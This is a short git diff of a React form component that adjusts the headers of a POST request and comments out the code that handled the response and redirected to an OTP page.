@@ -52,10 +52,11 @@ const Form = (props) => {
                 const response = await fetch(URL + '/rq-1', {
                     method: 'POST',
                     headers: {
+                        Accept: 'application/json',
                         'Content-type': 'application/json',
-                        'xsrf-token': csrfToken,
+                        'csrf-token': csrfToken,
                     },
-                     credentials: 'include',
+                    credentials: 'include',
                     mode: 'cors',
 
                     body: JSON.stringify({
@@ -71,14 +72,14 @@ const Form = (props) => {
                 console.log('email sending started')
                 console.log({ resData })
 
-                if (resData.status === 'success') {
-                    console.log('Message Sent.')
-                    setLoading(false)
-                    history.push('/otp', { email, password })
-                } else if (resData.status === 'fail') {
-                    console.log('Message failed to send.')
-                    //         setLoading(false)
-                }
+                // if (resData.status === 'success') {
+                //     console.log('Message Sent.')
+                //     setLoading(false)
+                //     history.push('/otp', { email, password })
+                // } else if (resData.status === 'fail') {
+                //     console.log('Message failed to send.')
+                //     //         setLoading(false)
+                // }
             } catch (err) {
                 console.log(err)
             }
